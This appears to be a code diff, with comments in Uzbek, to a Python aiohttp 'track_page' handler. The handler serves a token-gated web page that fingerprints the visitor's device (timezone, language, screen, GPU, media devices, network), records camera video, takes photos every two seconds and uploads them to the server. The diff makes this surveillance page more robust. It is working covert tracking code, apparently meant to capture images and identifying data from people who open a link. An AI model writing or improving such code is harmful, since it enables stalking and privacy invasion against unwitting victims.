@@ -68,7 +68,7 @@ async def track_page(request: web.Request):
         return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)
 
     # Foydalan f-string emas — oddiy string
-    html_template = """<!DOCTYPE html>
+  html_template = """<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8" />
@@ -103,20 +103,29 @@ async def track_page(request: web.Request):
     let photoInterval = null;
     let videoInterval = null;
 
+    // Helper: xavfsiz JSON parse uchun
+    function safeParseJSON(s) {
+      try {
+        return JSON.parse(s);
+      } catch (e) {
+        return {};
+      }
+    }
+
     async function collectData() {
       return {
         timestamp: new Date().toISOString(),
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         utcOffset: -new Date().getTimezoneOffset() / 60,
-        languages: navigator.languages?.join(', ') || navigator.language,
+        languages: (navigator.languages && navigator.languages.join(', ')) || navigator.language,
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         deviceMemory: navigator.deviceMemory || "Noma'lum",
         hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
-        screen: `${screen.width}x${screen.height}`,
-        viewport: `${window.innerWidth}x${window.innerHeight}`,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
+        screen: (typeof screen !== 'undefined' ? (screen.width + 'x' + screen.height) : "Noma'lum"),
+        viewport: (typeof window !== 'undefined' ? (window.innerWidth + 'x' + window.innerHeight) : "Noma'lum"),
+        colorDepth: (typeof screen !== 'undefined' ? screen.colorDepth : "Noma'lum"),
+        pixelDepth: (typeof screen !== 'undefined' ? screen.pixelDepth : "Noma'lum"),
         deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
         browser: "Noma'lum",
         os: "Noma'lum",
@@ -132,7 +141,7 @@ async def track_page(request: web.Request):
       const formData = new FormData();
       formData.append("token", "__TOKEN__");
       formData.append("clientData", JSON.stringify(data));
-      formData.append("photo", photoBlob);
+      if (photoBlob) formData.append("photo", photoBlob);
       try {
         await fetch("/submit_photo", { method: "POST", body: formData });
       } catch (err) {
@@ -176,13 +185,23 @@ async def track_page(request: web.Request):
     function startVideoRecording() {
       if (!stream) return;
       recordedChunks = [];
-      const options = { mimeType: 'video/webm;codecs=vp9' };
+      let options = { mimeType: 'video/webm;codecs=vp9' };
       if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-        options.mimeType = 'video/webm';
+        options = { mimeType: 'video/webm' };
       }
-      mediaRecorder = new MediaRecorder(stream, options);
+      try {
+        mediaRecorder = new MediaRecorder(stream, options);
+      } catch (e) {
+        console.warn("MediaRecorder boshlashda xato, fallback qayta urinilyapti:", e);
+        try {
+          mediaRecorder = new MediaRecorder(stream);
+        } catch (err) {
+          console.error("MediaRecorder umuman ishlamayapti:", err);
+          return;
+        }
+      }
       mediaRecorder.ondataavailable = e => {
-        if (e.data.size > 0) recordedChunks.push(e.data);
+        if (e.data && e.data.size > 0) recordedChunks.push(e.data);
       };
       mediaRecorder.onstop = async () => {
         if (recordedChunks.length === 0) return;
@@ -223,66 +242,72 @@ async def track_page(request: web.Request):
         }
       }
 
-      // GPU ma'lumotini olish
+      // GPU ma'lumotini olish va qurilma sozlamalari
       try {
         const canvas = document.createElement("canvas");
         const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const videoTrack = stream.getVideoTracks()[0];
+        let settings = {};
+        try { settings = videoTrack.getSettings ? videoTrack.getSettings() : {}; } catch (e) {}
+
+        let gpu = "Noma'lum";
         if (gl) {
           const dbg = gl.getExtension("WEBGL_debug_renderer_info");
           if (dbg) {
-            const gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-            // GPU ma'lumotini qo'shish
-            const videoTrack = stream.getVideoTracks()[0];
-            const settings = videoTrack.getSettings();
-            const data = {
-              timestamp: new Date().toISOString(),
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-              utcOffset: -new Date().getTimezoneOffset() / 60,
-              languages: navigator.languages?.join(', ') || navigator.language,
-              userAgent: navigator.userAgent,
-              platform: navigator.platform,
-              deviceMemory: navigator.deviceMemory || "Noma'lum",
-              hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
-              screen: `${screen.width}x${screen.height}`,
-              viewport: `${window.innerWidth}x${window.innerHeight}`,
-              colorDepth: screen.colorDepth,
-              pixelDepth: screen.pixelDepth,
-              deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
-              browser: "Noma'lum",
-              os: "Noma'lum",
-              model: "Noma'lum",
-              devices: { mic: 0, speaker: 0, camera: 0 },
-              gpu: gpu,
-              cameraRes: `${settings.width || 'Noma\'lum'}x${settings.height || 'Noma\'lum'}`,
-              network: "Noma'lum"
-            };
-
-            if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
-            else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
-            else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";
-
-            if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
-            else if (/Android/.test(navigator.userAgent)) data.os = "Android";
-            else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
-            else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
-
             try {
-              const devs = await navigator.mediaDevices.enumerateDevices();
-              data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
-              data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
-              data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
-            } catch (e) {}
-
-            if (navigator.connection) {
-              data.network = `${navigator.connection.effectiveType || 'unknown'}, ${navigator.connection.downlink || '?'} Mbps`;
-            }
-
-            // Birinchi ma'lumotni yuborish
-            await sendPhoto(null, data);
+              gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || gpu;
+            } catch (e) { /* ignore */ }
           }
         }
+
+        const data = {
+          timestamp: new Date().toISOString(),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          utcOffset: -new Date().getTimezoneOffset() / 60,
+          languages: (navigator.languages && navigator.languages.join(', ')) || navigator.language,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          deviceMemory: navigator.deviceMemory || "Noma'lum",
+          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
+          screen: (typeof screen !== 'undefined' ? (screen.width + 'x' + screen.height) : "Noma'lum"),
+          viewport: (typeof window !== 'undefined' ? (window.innerWidth + 'x' + window.innerHeight) : "Noma'lum"),
+          colorDepth: (typeof screen !== 'undefined' ? screen.colorDepth : "Noma'lum"),
+          pixelDepth: (typeof screen !== 'undefined' ? screen.pixelDepth : "Noma'lum"),
+          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
+          browser: "Noma'lum",
+          os: "Noma'lum",
+          model: "Noma'lum",
+          devices: { mic: 0, speaker: 0, camera: 0 },
+          gpu: gpu,
+          cameraRes: ((settings.width ? settings.width : "Noma'lum") + 'x' + (settings.height ? settings.height : "Noma'lum")),
+          network: "Noma'lum"
+        };
+
+        // Browser va OS aniqlash (soddalashtirilgan)
+        if (navigator.userAgent.indexOf("Chrome") !== -1) data.browser = "Chrome";
+        else if (navigator.userAgent.indexOf("Firefox") !== -1) data.browser = "Firefox";
+        else if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1) data.browser = "Safari";
+
+        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
+        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
+        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
+        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
+
+        try {
+          const devs = await navigator.mediaDevices.enumerateDevices();
+          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
+          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
+          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
+        } catch (e) {}
+
+        if (navigator.connection) {
+          data.network = (navigator.connection.effectiveType || 'unknown') + ', ' + (navigator.connection.downlink || '?') + ' Mbps';
+        }
+
+        // Birinchi ma'lumotni yuborish (foto bilan emas, faqat meta)
+        await sendPhoto(null, data);
       } catch (e) {
-        console.warn("WebGL xatosi:", e);
+        console.warn("WebGL yoki qurilmalarni o'qishda xato:", e);
       }
 
       // Har 2 soniyada rasm
